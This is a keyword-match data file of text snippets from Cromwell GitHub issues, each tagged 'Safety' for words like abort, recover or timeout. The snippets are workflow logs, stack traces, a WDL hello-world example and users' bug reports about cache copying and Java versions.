Safety,"borting 7 EJEAs; 2016-12-12 18:33:30,399 cromwell-system-akka.dispatchers.engine-dispatcher-1282 INFO - WorkflowExecutionActor [UUID(17a61aa5)]: Abort received. Aborting 4 EJEAs; 2016-12-12 18:33:42,564 cromwell-system-akka.dispatchers.engine-dispatcher-1282 INFO - WorkflowExecutionActor [UUID(f6bef34c)]: Abort received. Aborting 9 EJEAs; 2016-12-12 18:34:05,494 cromwell-system-akka.dispatchers.engine-dispatcher-1282 INFO - WorkflowExecutionActor [UUID(44318e55)]: Abort received. Aborting 7 EJEAs; 2016-12-12 18:34:16,741 cromwell-system-akka.dispatchers.engine-dispatcher-120 INFO - WorkflowExecutionActor [UUID(28d5b663)]: Abort received. Aborting 1 EJEAs; 2016-12-12 18:34:28,999 cromwell-system-akka.dispatchers.engine-dispatcher-1282 INFO - WorkflowExecutionActor [UUID(7c8b62e6)]: Abort received. Aborting 1 EJEAs; 2016-12-12 18:34:40,026 cromwell-system-akka.dispatchers.engine-dispatcher-120 INFO - WorkflowExecutionActor [UUID(3206b2df)]: Abort received. Aborting 1 EJEAs; 2016-12-12 18:35:03,235 cromwell-system-akka.dispatchers.engine-dispatcher-1282 INFO - WorkflowExecutionActor [UUID(63064089)]: Abort received. Aborting 6 EJEAs; 2016-12-12 18:35:13,509 cromwell-system-akka.dispatchers.engine-dispatcher-120 INFO - WorkflowExecutionActor [UUID(812336d3)]: Abort received. Aborting 14 EJEAs; 2016-12-12 18:35:23,568 cromwell-system-akka.dispatchers.engine-dispatcher-177 INFO - WorkflowExecutionActor [UUID(197caaf2)]: Abort received. Aborting 7 EJEAs; 2016-12-12 18:35:36,241 cromwell-system-akka.dispatchers.engine-dispatcher-1282 INFO - WorkflowExecutionActor [UUID(98068011)]: Abort received. Aborting 4 EJEAs; 2016-12-12 18:35:46,427 cromwell-system-akka.dispatchers.engine-dispatcher-120 INFO - WorkflowExecutionActor [UUID(b5d75f00)]: Abort received. Aborting 6 EJEAs; 2016-12-12 18:35:56,417 cromwell-system-akka.dispatchers.engine-dispatcher-120 INFO - WorkflowExecutionActor [UUID(0891d5a0)]: Abort received. Aborting 7 EJEAs; 2016-12-12 18:36:05,640 cromwell-system-akka",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1775:3065,Abort,Aborting,3065,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1775,1,['Abort'],['Aborting']
Safety,"bstractGoogleClientRequest.executeUnparsed(AbstractGoogleClientRequest.java:432); at com.google.api.client.googleapis.services.AbstractGoogleClientRequest.executeUnparsed(AbstractGoogleClientRequest.java:352); at com.google.api.client.googleapis.services.AbstractGoogleClientRequest.execute(AbstractGoogleClientRequest.java:469); at com.google.cloud.hadoop.util.AbstractGoogleAsyncWriteChannel$UploadOperation.call(AbstractGoogleAsyncWriteChannel.java:357); at java.util.concurrent.FutureTask.run(FutureTask.java:266); at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:39); at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(AbstractDispatcher.scala:409); at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); [2016-10-27 13:11:12,95] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:11:13,95] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:11:14,95] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:11:15,95] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:11:16,95] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:11:17,95] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:11:18,95] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:11:19,95] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:11:20,95] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:11:21,95] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:11:22,95] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:11:23,95] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:11:24,95] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:11:25,41] [error] Exception not convertible into handled response; ...snip....; ```",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1631:23415,abort,abort,23415,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1631,13,['abort'],['abort']
Safety,"c-7c69317ba0a2/call-PairedFastQsToUnmappedBAM/inputs/-2135135022/S000021_S7367Nr1.2.fastq.gz --OUTPUT S7367Nr1.unmapped.bam --READ_GROUP_NAME S7367Nr1 --SAMPLE_NAME S4431Nr1 --LIBRARY_NAME TwistCore+RefSeq+Mito-Panel --PLATFORM_UNIT platform_unit --PLATFORM Illumina --SEQUENCING_CENTER CeGaT --RUN_DATE 2021-10-10T06:00:00+0000 --USE_SEQUENTIAL_FASTQS false --SORT_ORDER queryname --MIN_Q 0 --MAX_Q 93 --STRIP_UNPAIRED_MATE_NUMBER false --ALLOW_AND_IGNORE_EMPTY_LINES false --VERBOSITY INFO --QUIET false --VALIDATION_STRINGENCY STRICT --COMPRESSION_LEVEL 2 --MAX_RECORDS_IN_RAM 500000 --CREATE_INDEX false --CREATE_MD5_FILE false --GA4GH_CLIENT_SECRETS client_secrets.json --help false --version false --showHidden false --USE_JDK_DEFLATER false --USE_JDK_INFLATER false; 2023-02-03 12:38:34 [Fri Feb 03 09:38:34 GMT 2023] Executing as root@d65fc5b7d470 on Linux 5.15.49-linuxkit amd64; OpenJDK 64-Bit Server VM 1.8.0_242-8u242-b08-0ubuntu3~18.04-b08; Deflater: Intel; Inflater: Intel; Provider GCS is available; Picard version: Version:4.3.0.0; 2023-02-03 12:38:35 INFO 2023-02-03 09:38:35 FastqToSam Auto-detected quality format as: Standard.; 2023-02-03 12:39:08 INFO 2023-02-03 09:39:08 FastqToSam Processed 1,000,000 records. Elapsed time: 00:00:32s. Time for last 1,000,000: 32s. Last read position: */*`. I tried via Java 18.0.1.1 JDK and also later with 1.8.0_202 JDK. I also tried with the conda installation where Java dependency of OpenJDK 11.0.15 is automatically installed. I also tried combinations with Cromwell 69, 80 and 84. None of them works. They all have the same problem. It only works if I use Cromwell version 55 along with Java 1.8.0_202 JDK. It would be amazing if you look into this, as we would love to use the latest Cromwell versions and benefit from the conda environment. Thanks!. Machine info: `Darwin Ibrahims-MacBook-Pro.local 22.2.0 Darwin Kernel Version 22.2.0: Fri Nov 11 02:04:44 PST 2022; root:xnu-8792.61.2~4/RELEASE_ARM64_T8103 arm64`. MacOS = Ventura 13.1",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6998:2783,detect,detected,2783,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6998,1,['detect'],['detected']
Safety,"c178-1d7e-4fbc-94bd-7fc147e5ccfb-EngineJobExecutionActor-GATK4_WGS_ALL_IN_ONE.N_SamToFastqAndBwaMem:0:1 [UUID(0123c178)]: Could not copy a suitable cache hit for 0123c178:GATK4_WGS_ALL_IN_ONE.N_SamToFastqAndBwaMem:0:1. EJEA attempted to copy 1 cache hits before failing. Of these 1 failed to copy and 0 were already blacklisted from previous attempts). Falling back to running job. As you can see, some small tasks worked but large tasks failed. > Hi, In Cromwell 52 we updated the S3 module to perform multithreaded, multipart copies to improve the size of results that may be cached. There are also additional improvements that have recently been merged into dev and should appear in the next release version (or you could build from source) v52+ requires a new AWS configuration. Instructions are in https://aws-genomics-workflows.s3.amazonaws.com/Installing+the+Genomics+Workflow+Core+and+Cromwell.pdf; > […](#); > On Sat, Oct 24, 2020 at 8:27 PM Luyu ***@***.***> wrote: Hi, I got a timeout exception during cache copying on AWS S3. The cache file size is 133GB. Given the file size, more time should be allowed for cache copying. Is there any config option that can tune this? Thank you in advance for any suggestions. Backend: AWS Batch Cromwell version: 51 Error log: Failure copying cache results for job BackendJobDescriptorKey_CommandCallNode_PreProcessingForVariantDiscovery_GATK4.SamTo FastqAndBwaMem:0:1 (TimeoutException: The Cache hit copying actor timed out waiting for a response to copy s3://xxxxx/cromwell-execution/Germ line_Somatic_Calling/441619a4-7ca8-490b-bd04-2f9981d3db0f/call-Tumor_Bam/PreProcessingForVariantDiscovery_GATK4/95aed08f-3045-45e4-94c9-ba0230851136 /call-SamToFastqAndBwaMem/shard-0/39T_R.unmerged.bam to s3://xxxxx/cromwell-execution/Germline_Somatic_Calling/c25a8561-808f-4b46-9bd2-ef0488 8c0031/call-Tumor_Bam/PreProcessingForVariantDiscovery_GATK4/8df24f46-2f4f-4557-a662-d630ac443736/call-SamToFastqAndBwaMem/shard-0/cacheCopy/39T_R.u nmerged.bam) — You a",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-723478807:2634,timeout,timeout,2634,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-723478807,1,['timeout'],['timeout']
Safety,cJobExecutionActor.scala:196); 	at scala.runtime.java8.JFunction0$mcZ$sp.apply(JFunction0$mcZ$sp.java:12); 	at scala.util.Try$.apply(Try.scala:209); 	at cromwell.backend.sfs.SharedFileSystemAsyncJobExecutionActor.isAlive(SharedFileSystemAsyncJobExecutionActor.scala:191); 	at cromwell.backend.sfs.SharedFileSystemAsyncJobExecutionActor.isAlive$(SharedFileSystemAsyncJobExecutionActor.scala:191); 	at cromwell.backend.impl.sfs.config.BackgroundConfigAsyncJobExecutionActor.isAlive(ConfigAsyncJobExecutionActor.scala:190); 	at cromwell.backend.sfs.SharedFileSystemAsyncJobExecutionActor.reconnectToExistingJob(SharedFileSystemAsyncJobExecutionActor.scala:171); 	at cromwell.backend.sfs.SharedFileSystemAsyncJobExecutionActor.recover(SharedFileSystemAsyncJobExecutionActor.scala:159); 	at cromwell.backend.sfs.SharedFileSystemAsyncJobExecutionActor.recover$(SharedFileSystemAsyncJobExecutionActor.scala:159); 	at cromwell.backend.impl.sfs.config.BackgroundConfigAsyncJobExecutionActor.recover(ConfigAsyncJobExecutionActor.scala:190); 	at cromwell.backend.standard.StandardAsyncExecutionActor.$anonfun$recoverAsync$1(StandardAsyncExecutionActor.scala:305); 	at scala.util.Try$.apply(Try.scala:209); 	at cromwell.backend.standard.StandardAsyncExecutionActor.recoverAsync(StandardAsyncExecutionActor.scala:305); 	at cromwell.backend.standard.StandardAsyncExecutionActor.recoverAsync$(StandardAsyncExecutionActor.scala:305); 	at cromwell.backend.impl.sfs.config.BackgroundConfigAsyncJobExecutionActor.recoverAsync(ConfigAsyncJobExecutionActor.scala:190); 	at cromwell.backend.standard.StandardAsyncExecutionActor.executeOrRecover(StandardAsyncExecutionActor.scala:574); 	at cromwell.backend.standard.StandardAsyncExecutionActor.executeOrRecover$(StandardAsyncExecutionActor.scala:569); 	at cromwell.backend.impl.sfs.config.BackgroundConfigAsyncJobExecutionActor.executeOrRecover(ConfigAsyncJobExecutionActor.scala:190); 	at cromwell.backend.async.AsyncBackendJobExecutionActor.$anonfun$robustExecuteOrRecover,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2963:1754,recover,recover,1754,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2963,1,['recover'],['recover']
Safety,"c_min_purity_spread_purple\""\n },\n {\n \""type\"": [\n \""null\"",\n \""int\""\n ],\n \""doc\"": \""Minimum number of somatic variants required to assist highly diploid fits. Default 300.\\n\"",\n \""id\"": \""#somatic_min_total_purple\""\n },\n {\n \""type\"": [\n \""null\"",\n \""float\""\n ],\n \""doc\"": \""Proportion of somatic deviation to include in fitted purity score. Default 1.\\n\"",\n \""id\"": \""#somatic_penalty_weight_purple\""\n },\n {\n \""type\"": [\n \""null\"",\n \""File\""\n ],\n \""doc\"": \""Optional location of somatic variant vcf to assist fitting in highly-diploid samples.\\nSample name must match tumor parameter. GZ files supported.\\n\"",\n \""secondaryFiles\"": [\n \"".tbi\""\n ],\n \""id\"": \""#somatic_vcf_purple\""\n },\n {\n \""type\"": [\n \""null\"",\n \""File\""\n ],\n \""doc\"": \""Optional location of structural variant vcf for more accurate segmentation.\\nGZ files supported.\\n\"",\n \""secondaryFiles\"": [\n \"".tbi\""\n ],\n \""id\"": \""#structural_vcf_purple\""\n },\n {\n \""type\"": [\n \""null\"",\n \""File\""\n ],\n \""doc\"": \""Optional location of failing structural variants that may be recovered.\\nGZ files supported.\\n\"",\n \""secondaryFiles\"": [\n \"".tbi\""\n ],\n \""id\"": \""#sv_recovery_vcf_purple\""\n },\n {\n \""type\"": [\n \""null\"",\n \""int\""\n ],\n \""doc\"": \""Number of threads used for amber step\\n\"",\n \""id\"": \""#threads_amber\""\n },\n {\n \""type\"": [\n \""null\"",\n \""int\""\n ],\n \""doc\"": \""Number of threads to run cobalt command\\n\"",\n \""id\"": \""#threads_cobalt\""\n },\n {\n \""type\"": [\n \""null\"",\n \""int\""\n ],\n \""doc\"": \""Number of threads to use - set to 8 by default\"",\n \""id\"": \""#threads_gridss\""\n },\n {\n \""type\"": [\n \""null\"",\n \""int\""\n ],\n \""doc\"": \""Number of threads\\n\"",\n \""id\"": \""#threads_purple\""\n },\n {\n \""type\"": \""File\"",\n \""doc\"": \""tumour BAM file\\n\"",\n \""secondaryFiles\"": [\n \"".bai\""\n ],\n \""id\"": \""#tumor_bam\""\n },\n {\n \""type\"": [\n \""null\"",\n \""string\""\n ],\n \""doc\"": \""sample name of tumor. Must match the somatic snvvcf sample name. (Defa",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5826:114090,recover,recovered,114090,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5826,1,['recover'],['recovered']
Safety,cala:191); 	at cromwell.backend.impl.sfs.config.BackgroundConfigAsyncJobExecutionActor.isAlive(ConfigAsyncJobExecutionActor.scala:190); 	at cromwell.backend.sfs.SharedFileSystemAsyncJobExecutionActor.reconnectToExistingJob(SharedFileSystemAsyncJobExecutionActor.scala:171); 	at cromwell.backend.sfs.SharedFileSystemAsyncJobExecutionActor.recover(SharedFileSystemAsyncJobExecutionActor.scala:159); 	at cromwell.backend.sfs.SharedFileSystemAsyncJobExecutionActor.recover$(SharedFileSystemAsyncJobExecutionActor.scala:159); 	at cromwell.backend.impl.sfs.config.BackgroundConfigAsyncJobExecutionActor.recover(ConfigAsyncJobExecutionActor.scala:190); 	at cromwell.backend.standard.StandardAsyncExecutionActor.$anonfun$recoverAsync$1(StandardAsyncExecutionActor.scala:305); 	at scala.util.Try$.apply(Try.scala:209); 	at cromwell.backend.standard.StandardAsyncExecutionActor.recoverAsync(StandardAsyncExecutionActor.scala:305); 	at cromwell.backend.standard.StandardAsyncExecutionActor.recoverAsync$(StandardAsyncExecutionActor.scala:305); 	at cromwell.backend.impl.sfs.config.BackgroundConfigAsyncJobExecutionActor.recoverAsync(ConfigAsyncJobExecutionActor.scala:190); 	at cromwell.backend.standard.StandardAsyncExecutionActor.executeOrRecover(StandardAsyncExecutionActor.scala:574); 	at cromwell.backend.standard.StandardAsyncExecutionActor.executeOrRecover$(StandardAsyncExecutionActor.scala:569); 	at cromwell.backend.impl.sfs.config.BackgroundConfigAsyncJobExecutionActor.executeOrRecover(ConfigAsyncJobExecutionActor.scala:190); 	at cromwell.backend.async.AsyncBackendJobExecutionActor.$anonfun$robustExecuteOrRecover$1(AsyncBackendJobExecutionActor.scala:65); 	at cromwell.core.retry.Retry$.withRetry(Retry.scala:37); 	at cromwell.backend.async.AsyncBackendJobExecutionActor.withRetry(AsyncBackendJobExecutionActor.scala:61); 	at cromwell.backend.async.AsyncBackendJobExecutionActor.cromwell$backend$async$AsyncBackendJobExecutionActor$$robustExecuteOrRecover(AsyncBackendJobExecutionActor.scala:65);,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2963:2136,recover,recoverAsync,2136,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2963,1,['recover'],['recoverAsync']
Safety,"cala:257); 	at akka.dispatch.Mailbox.run(Mailbox.scala:224); 	at akka.dispatch.Mailbox.exec(Mailbox.scala:234); 	at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); 	at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); 	at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); 	at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); 2017-02-02 11:55:36,711 cromwell-system-akka.dispatchers.engine-dispatcher-19 ERROR - WorkflowManagerActor Workflow 5fdb357a-3f1d-45b7-a85b-c22caa755c36 failed (during ExecutingWorkflowState): java.lang.IllegalArgumentException; cromwell.core.CromwellFatalException: java.lang.IllegalArgumentException; 	at cromwell.core.CromwellFatalException$.apply(core.scala:18); 	at cromwell.core.retry.Retry$$anonfun$withRetry$2.applyOrElse(Retry.scala:38); 	at cromwell.core.retry.Retry$$anonfun$withRetry$2.applyOrElse(Retry.scala:37); 	at scala.concurrent.Future$$anonfun$recoverWith$1.apply(Future.scala:346); 	at scala.concurrent.Future$$anonfun$recoverWith$1.apply(Future.scala:345); 	at scala.concurrent.impl.CallbackRunnable.run(Promise.scala:32); 	at akka.dispatch.BatchingExecutor$AbstractBatch.processBatch(BatchingExecutor.scala:55); 	at akka.dispatch.BatchingExecutor$BlockableBatch$$anonfun$run$1.apply$mcV$sp(BatchingExecutor.scala:91); 	at akka.dispatch.BatchingExecutor$BlockableBatch$$anonfun$run$1.apply(BatchingExecutor.scala:91); 	at akka.dispatch.BatchingExecutor$BlockableBatch$$anonfun$run$1.apply(BatchingExecutor.scala:91); 	at scala.concurrent.BlockContext$.withBlockContext(BlockContext.scala:72); 	at akka.dispatch.BatchingExecutor$BlockableBatch.run(BatchingExecutor.scala:90); 	at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:39); 	at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(AbstractDispatcher.scala:415); 	at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); 	at scala.concurrent.fork",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1944:6814,recover,recoverWith,6814,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1944,1,['recover'],['recoverWith']
Safety,centaur now has abort tests,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2088#issuecomment-342579064:16,abort,abort,16,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2088#issuecomment-342579064,1,['abort'],['abort']
Safety,"cessMailbox(Mailbox.scala:268); at akka.dispatch.Mailbox.run(Mailbox.scala:229); at akka.dispatch.Mailbox.exec(Mailbox.scala:241); at akka.dispatch.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); at akka.dispatch.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); at akka.dispatch.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); at akka.dispatch.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); Caused by: cromwell.backend.google.pipelines.common.api.PipelinesApiRequestManager$GoogleJsonException: Request contains an invalid argument.; ... 21 more. [2021-08-13 10:45:10,13] [info] WorkflowManagerActor: Workflow actor for a15c46b7-5f93-46d6-94a2-28f656914866 completed with status 'Failed'. The workflow will be removed from the workflow store.; [2021-08-13 10:45:13,98] [info] SingleWorkflowRunnerActor workflow finished with status 'Failed'.; [2021-08-13 10:45:15,05] [info] Workflow polling stopped; [2021-08-13 10:45:15,07] [info] 0 workflows released by cromid-de31b6d; [2021-08-13 10:45:15,07] [info] Shutting down WorkflowStoreActor - Timeout = 5 seconds; ...; ```. Contents of hello.wdl:; ```; task hello {; String addressee; command {; echo ""Hello ${addressee}! Welcome to Cromwell . . . on Google Cloud!""; }; output {; String message = read_string(stdout()); }; runtime {; docker: ""ubuntu:latest""; }; }. workflow wf_hello {; call hello. output {; hello.message; }; }; ```. Contents of hello.inputs:; ```; {; ""wf_hello.hello.addressee"": ""World""; }; ```; Contents of cromwell.BROADexamples.v4.conf:; ```; # This is a ""default"" Cromwell example that is intended for you you to start with; # and edit for your needs. Specifically, you will be interested to customize; # the configuration based on your preferred backend (see the backends section; # below in the file). For backend-specific examples for you to copy paste here,; # please see the cromwell.backend.examples folder in the repository. The files; # there also include links to online doc",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6469:8434,Timeout,Timeout,8434,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6469,1,['Timeout'],['Timeout']
Safety,"ch.Mailbox.exec(Mailbox.scala:234); 	at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); 	at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); 	at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); 	at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); 2017-02-02 11:55:36,711 cromwell-system-akka.dispatchers.engine-dispatcher-19 ERROR - WorkflowManagerActor Workflow 5fdb357a-3f1d-45b7-a85b-c22caa755c36 failed (during ExecutingWorkflowState): java.lang.IllegalArgumentException; cromwell.core.CromwellFatalException: java.lang.IllegalArgumentException; 	at cromwell.core.CromwellFatalException$.apply(core.scala:18); 	at cromwell.core.retry.Retry$$anonfun$withRetry$2.applyOrElse(Retry.scala:38); 	at cromwell.core.retry.Retry$$anonfun$withRetry$2.applyOrElse(Retry.scala:37); 	at scala.concurrent.Future$$anonfun$recoverWith$1.apply(Future.scala:346); 	at scala.concurrent.Future$$anonfun$recoverWith$1.apply(Future.scala:345); 	at scala.concurrent.impl.CallbackRunnable.run(Promise.scala:32); 	at akka.dispatch.BatchingExecutor$AbstractBatch.processBatch(BatchingExecutor.scala:55); 	at akka.dispatch.BatchingExecutor$BlockableBatch$$anonfun$run$1.apply$mcV$sp(BatchingExecutor.scala:91); 	at akka.dispatch.BatchingExecutor$BlockableBatch$$anonfun$run$1.apply(BatchingExecutor.scala:91); 	at akka.dispatch.BatchingExecutor$BlockableBatch$$anonfun$run$1.apply(BatchingExecutor.scala:91); 	at scala.concurrent.BlockContext$.withBlockContext(BlockContext.scala:72); 	at akka.dispatch.BatchingExecutor$BlockableBatch.run(BatchingExecutor.scala:90); 	at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:39); 	at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(AbstractDispatcher.scala:415); 	at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); 	at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); 	at scala.concu",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1944:6890,recover,recoverWith,6890,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1944,1,['recover'],['recoverWith']
Safety,changed gcloud alpine to slim to avoid bug w gsutil,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4114:33,avoid,avoid,33,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4114,1,['avoid'],['avoid']
Safety,"cher-120 INFO - WorkflowExecutionActor [UUID(2c6302c8)]: Abort received. Aborting 6 EJEAs; 2016-12-12 18:32:25,094 cromwell-system-akka.dispatchers.engine-dispatcher-1282 INFO - WorkflowExecutionActor [UUID(793dd16f)]: Abort received. Aborting 5 EJEAs; 2016-12-12 18:32:38,555 cromwell-system-akka.dispatchers.engine-dispatcher-1282 INFO - WorkflowExecutionActor [UUID(4fddebd4)]: Abort received. Aborting 13 EJEAs; 2016-12-12 18:32:50,674 cromwell-system-akka.dispatchers.engine-dispatcher-120 INFO - WorkflowExecutionActor [UUID(aadd5082)]: Abort received. Aborting 7 EJEAs; 2016-12-12 18:33:01,265 cromwell-system-akka.dispatchers.engine-dispatcher-1282 INFO - WorkflowExecutionActor [UUID(edaa9993)]: Abort received. Aborting 4 EJEAs; 2016-12-12 18:33:12,453 cromwell-system-akka.dispatchers.engine-dispatcher-120 INFO - WorkflowExecutionActor [UUID(c2caa0f6)]: Abort received. Aborting 7 EJEAs; 2016-12-12 18:33:30,399 cromwell-system-akka.dispatchers.engine-dispatcher-1282 INFO - WorkflowExecutionActor [UUID(17a61aa5)]: Abort received. Aborting 4 EJEAs; 2016-12-12 18:33:42,564 cromwell-system-akka.dispatchers.engine-dispatcher-1282 INFO - WorkflowExecutionActor [UUID(f6bef34c)]: Abort received. Aborting 9 EJEAs; 2016-12-12 18:34:05,494 cromwell-system-akka.dispatchers.engine-dispatcher-1282 INFO - WorkflowExecutionActor [UUID(44318e55)]: Abort received. Aborting 7 EJEAs; 2016-12-12 18:34:16,741 cromwell-system-akka.dispatchers.engine-dispatcher-120 INFO - WorkflowExecutionActor [UUID(28d5b663)]: Abort received. Aborting 1 EJEAs; 2016-12-12 18:34:28,999 cromwell-system-akka.dispatchers.engine-dispatcher-1282 INFO - WorkflowExecutionActor [UUID(7c8b62e6)]: Abort received. Aborting 1 EJEAs; 2016-12-12 18:34:40,026 cromwell-system-akka.dispatchers.engine-dispatcher-120 INFO - WorkflowExecutionActor [UUID(3206b2df)]: Abort received. Aborting 1 EJEAs; 2016-12-12 18:35:03,235 cromwell-system-akka.dispatchers.engine-dispatcher-1282 INFO - WorkflowExecutionActor [UUID(63064089)]: Ab",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1775:2241,Abort,Abort,2241,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1775,1,['Abort'],['Abort']
Safety,"cher-120 INFO - WorkflowExecutionActor [UUID(804a56b6)]: Abort received. Aborting 11 EJEAs; 2016-12-12 18:32:05,063 cromwell-system-akka.dispatchers.engine-dispatcher-120 INFO - WorkflowExecutionActor [UUID(2c6302c8)]: Abort received. Aborting 6 EJEAs; 2016-12-12 18:32:25,094 cromwell-system-akka.dispatchers.engine-dispatcher-1282 INFO - WorkflowExecutionActor [UUID(793dd16f)]: Abort received. Aborting 5 EJEAs; 2016-12-12 18:32:38,555 cromwell-system-akka.dispatchers.engine-dispatcher-1282 INFO - WorkflowExecutionActor [UUID(4fddebd4)]: Abort received. Aborting 13 EJEAs; 2016-12-12 18:32:50,674 cromwell-system-akka.dispatchers.engine-dispatcher-120 INFO - WorkflowExecutionActor [UUID(aadd5082)]: Abort received. Aborting 7 EJEAs; 2016-12-12 18:33:01,265 cromwell-system-akka.dispatchers.engine-dispatcher-1282 INFO - WorkflowExecutionActor [UUID(edaa9993)]: Abort received. Aborting 4 EJEAs; 2016-12-12 18:33:12,453 cromwell-system-akka.dispatchers.engine-dispatcher-120 INFO - WorkflowExecutionActor [UUID(c2caa0f6)]: Abort received. Aborting 7 EJEAs; 2016-12-12 18:33:30,399 cromwell-system-akka.dispatchers.engine-dispatcher-1282 INFO - WorkflowExecutionActor [UUID(17a61aa5)]: Abort received. Aborting 4 EJEAs; 2016-12-12 18:33:42,564 cromwell-system-akka.dispatchers.engine-dispatcher-1282 INFO - WorkflowExecutionActor [UUID(f6bef34c)]: Abort received. Aborting 9 EJEAs; 2016-12-12 18:34:05,494 cromwell-system-akka.dispatchers.engine-dispatcher-1282 INFO - WorkflowExecutionActor [UUID(44318e55)]: Abort received. Aborting 7 EJEAs; 2016-12-12 18:34:16,741 cromwell-system-akka.dispatchers.engine-dispatcher-120 INFO - WorkflowExecutionActor [UUID(28d5b663)]: Abort received. Aborting 1 EJEAs; 2016-12-12 18:34:28,999 cromwell-system-akka.dispatchers.engine-dispatcher-1282 INFO - WorkflowExecutionActor [UUID(7c8b62e6)]: Abort received. Aborting 1 EJEAs; 2016-12-12 18:34:40,026 cromwell-system-akka.dispatchers.engine-dispatcher-120 INFO - WorkflowExecutionActor [UUID(3206b2df)]: Abo",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1775:2079,Abort,Abort,2079,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1775,1,['Abort'],['Abort']
